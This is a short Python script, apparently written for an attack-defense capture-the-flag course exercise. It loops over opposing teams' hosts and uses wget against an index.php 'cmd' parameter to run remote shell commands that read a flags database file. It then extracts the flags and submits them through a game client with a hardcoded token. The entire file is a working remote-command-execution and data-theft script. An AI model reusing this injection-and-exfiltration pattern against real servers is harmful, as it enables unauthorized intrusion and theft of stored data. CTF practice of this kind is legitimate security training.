import os
from swpag_client import Team

t = Team("http://actf_team.cse545.io/", "zJIJuyswOWqyjCAznRUV")

for i in range (22):
    if i==8:
        continue
    cmd="wget -O team"+str(i)+".txt 'http://team'"+str(i)+"':10008/index.php?cmd=cat%20../rw/db/flags.sqlite3|grep%20-E%20-o%20-a%20%27FLG.{13}%27'"
    try:
        os.system(cmd)
        #print(i)
    except RuntimeError:
        continue

for i in range(22):
    flags=[]
    if i==8:
        continue
    f=open("team"+str(i)+".txt",'r')
    for line in f:
        try:
            if ("FLG" in line):
                #print(line[0:16])
                flags.append(line[0:16])
                #status=t.submit_flag([line[0:16]])
                #print(status)
        except RuntimeError:
            continue
    print(i)
    for flag in flags[-5:]:
        status=t.submit_flag([flag])
        print(status)

